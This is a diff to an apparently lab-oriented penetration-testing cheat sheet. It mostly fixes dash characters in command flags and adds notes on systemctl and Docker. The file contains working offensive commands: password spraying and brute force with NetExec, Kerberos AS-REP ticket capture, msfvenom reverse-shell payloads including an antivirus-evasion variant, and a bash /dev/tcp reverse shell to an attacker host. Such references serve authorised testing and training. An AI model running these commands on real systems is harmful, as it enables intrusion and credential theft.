@@ -34,7 +34,7 @@ UDP Scan (-sU): Slower, stateless protocol.
 - Nmap Host Discovery
 ```
 nmap -sn 10.129.2.0/24           # Scan network range for hosts only (no ports)
-nmap –iL hosts.txt               # Scan IP list in “hosts.txt” file
+nmap -iL hosts.txt               # Scan IP list in “hosts.txt” file
 nmap 10.129.2.28-30              # Scan multiple IPs
 ```
 - Nmap Service & Version Detection
@@ -43,7 +43,7 @@ nmap -sV 10.129.2.28-29          # detect service versions running on the target
 ```
 - Nmap OS Detection
 ```
-nmap –O 10.129.2.28-29           #  Detect the operating system of the target
+nmap -O 10.129.2.28-29           #  Detect the operating system of the target
 ```
 - Nmap Scripting Engine (NSE)
 ```
@@ -52,21 +52,21 @@ Example: nmap --script vuln 10.129.2.28
 
 Common scripts: vuln, auth, brute, discovery, exploit
 
-HINT: add –-min-rate 5000 to speed up scan, BUT this may cause errors or crashes...
+HINT: add --min-rate 5000 to speed up scan, BUT this may cause errors or crashes...
 ```
 - Nmap Saving Results
 ```
 Formats: -oN (Normal), -oG (grepable), -oX (XML), -oA (all formats)
-Example: nmap –oA scan_results 10.129.2.28-29
+Example: nmap -oA scan_results 10.129.2.28-29
 Files Generated: scan_results.nmap, scan_results.gnmap, scan_results.xm
 ```
 - Nmap Recommended Scans
 ```
 1. Fast:
-sudo nmap –A -iL hosts.txt
+sudo nmap -A --oX target_scan.xml -iL hosts.txt
 
 2. Robust:
-sudo nmap –A --script vuln –vv –p --oX target_scan.xml –iL hosts.txt –-min-rate 5000 –-stats-every=5s
+sudo nmap -A --script vuln -vv -p --oX target_scan.xml -iL hosts.txt --min-rate 5000 --stats-every=5s
 
 -A means –sV –sC –O
 -vv means verbose output
@@ -76,7 +76,7 @@ sudo nmap –A --script vuln –vv –p --oX target_scan.xml –iL hosts.txt –
 ```
 - Nmap View Results in Browser
 ```
-xsltproc target_scan.xml –o target_scan.html
+xsltproc target_scan.xml -o target_scan.html
 ```
 
 ## 2. SMB Enum
@@ -87,10 +87,10 @@ nxc <protocol> <ip address> <options>
 ```
   - NetExec User Enumeration 
 ```
-nxc smb 10.129.2.28 –u '' –p '' --users                            # lists users
-nxc smb 10.129.2.28 –u '' –p '' –-rid-brute                        # use this if you don't know about any existing users
-nxc smb 10.129.2.28 –u 'Guest' –p '' –-rid-brute                   # use the command with the Guest default account if the first command didn't work
-nxc smb 10.129.2.28 –u 'john' –p 'Pass123' –-rid-brute             # use this if you know a username and it's password on the target
+nxc smb 10.129.2.28 -u '' -p '' --users                            # lists users
+nxc smb 10.129.2.28 -u '' -p '' --rid-brute                        # use this if you don't know about any existing users
+nxc smb 10.129.2.28 -u 'Guest' -p '' --rid-brute                   # use the command with the Guest default account if the first command didn't work
+nxc smb 10.129.2.28 -u 'john' -p 'Pass123' --rid-brute             # use this if you know a username and it's password on the target
 ```
   - NetExec Share Enumeration
 ```
@@ -112,10 +112,10 @@ nxc smb 10.5.10.50 --pass-pol
  - NetExec SMB/RDP Password Attacks
 ```
 # Password Spraying Attack
-nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 –-ignore-pw-decoding
+nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 --ignore-pw-decoding
 
 # Brute Force with a wordlist (Dictionary Attack)
-nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt –-ignore-pw-decoding
+nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 
 
 # -u (path to users file)
@@ -151,10 +151,10 @@ gobuster dir -u http://10.20.10.31 -w /usr/share/wordlists/seclists/Discovery/We
  - NetExec SMB/RDP Password Attacks
 ```
 # Password Spraying Attack
-nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 –-ignore-pw-decoding
+nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 --ignore-pw-decoding
 
 # Brute Force with a wordlist (Dictionary Attack)
-nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt –-ignore-pw-decoding
+nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 
 
 # -u (path to users file)
@@ -164,7 +164,7 @@ nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt –-ignore-
  - Impacket Get-NPUsers
 ```
 # Allows us to capture Kerberos Tickets for users that do not require Kerberos pre authentication
-Impacket-GetNPUsers –request –dc-ip 10.129.2.28 example.com/ -usersfile users.txt –format hashcat –outputfile kerb.hash
+Impacket-GetNPUsers -request -dc-ip 10.129.2.28 example.com/ -usersfile users.txt -format hashcat -outputfile kerb.hash
 
 # -request (requests Kerberos ticket)
 # -dc-ip (ip address of domain controller)
@@ -189,7 +189,7 @@ https://hashcat.net/wiki/doku.php?id=example_hashes
 # Syntax: searchsploit <software and version>
 # Examples:
 searchsploit httpd 2.4
-searchsploit –m <script name>                    # copies found exploits to your current directory
+searchsploit -m <script name>                    # copies found exploits to your current directory
 ```
  -  Metasploit
 ```
@@ -212,16 +212,16 @@ exploit
 ```
 # A command-line tool for generating payloads (e.g., reverse shells, bind shells).
 
-# Syntax: msfvenom –p <payload> <options> -f <format> -o <output_file>
+# Syntax: msfvenom -p <payload> <options> -f <format> -o <output_file>
 
 # Example Windows Payload:
-msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –f aspx –o shell.aspx
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 -f aspx -o shell.aspx
 
 # Example Linux Payload:
-msfvenom –p linux/x86/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –f aspx –o shell.aspx
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 -f aspx -o shell.aspx
 
 # Example Encoded Payload (AV bypass):
-msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –e x86/shikata_ga_nai –f aspx –o encoded_shell.aspx
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 -e x86/shikata_ga_nai -f aspx -o encoded_shell.aspx
 ```
  - Bloodhound
 ```
@@ -229,7 +229,7 @@ msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 �
 
 # Example Workflow
 1. Gernerate JSON files from the Active Directory database
-bloodhound-python –u mark.landry –p 987654321 –ns 10.129.2.28 –d example.com –c all
+bloodhound-python -u mark.landry -p 987654321 -ns 10.129.2.28 -d example.com -c all
 
 # -u username
 # -p password
@@ -264,7 +264,7 @@ scp payload.exe administrator@10.5.10.30:/C:/Users/Administrator/Desktop/users.t
 # Syntax: rsync -avz payload.txt user@target:/path/to/destination
 
 # Example:
-rsync –azv /opt/linpeas/linpeas.sh mlandry@10.129.2.29:/tmp
+rsync -azv /opt/linpeas/linpeas.sh mlandry@10.129.2.29:/tmp
 ```
 - Delivering Files via xfreerdp
 ```
@@ -418,7 +418,7 @@ bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1
 
 # Example Workflow
 1. Gernerate JSON files from the Active Directory database
-bloodhound-python –u mark.landry –p 987654321 –ns 10.129.2.28 –d example.com –c all
+bloodhound-python -u mark.landry -p 987654321 -ns 10.129.2.28 -d example.com -c all
 
 # -u username
 # -p password
@@ -532,5 +532,47 @@ Set-Service -Name "sshd" -StartupType Disabled
 Set-Service -Name "sshd" -StartupType Automatic
 ```
 
+### Linux Services and Containers
 
+- Linux Services
+```bash
+# Manage services using systemctl
 
+# Stop a service
+sudo systemctl stop <service_name>
+# Example:
+sudo systemctl stop apache2
+
+# Disable a service (won’t start on boot)
+sudo systemctl disable <service_name>
+# Example:
+sudo systemctl disable apache2
+
+# Start a service
+sudo systemctl start <service_name>
+# Example:
+sudo systemctl start apache2
+
+# Restart a service
+sudo systemctl restart <service_name>
+# Example:
+sudo systemctl restart apache2
+
+# Enable a service (start on boot)
+sudo systemctl enable <service_name>
+# Example:
+sudo systemctl enable apache2
+```
+
+- Containers (Docker)
+```bash
+# Stop Docker service
+sudo systemctl stop docker
+
+# Stop all running containers
+docker stop $(docker ps -q)
+
+# Stop and remove containers using docker-compose
+# (replace /path/to/docker-compose.yml with the actual file path)
+docker compose -f /path/to/docker-compose.yml down
+```
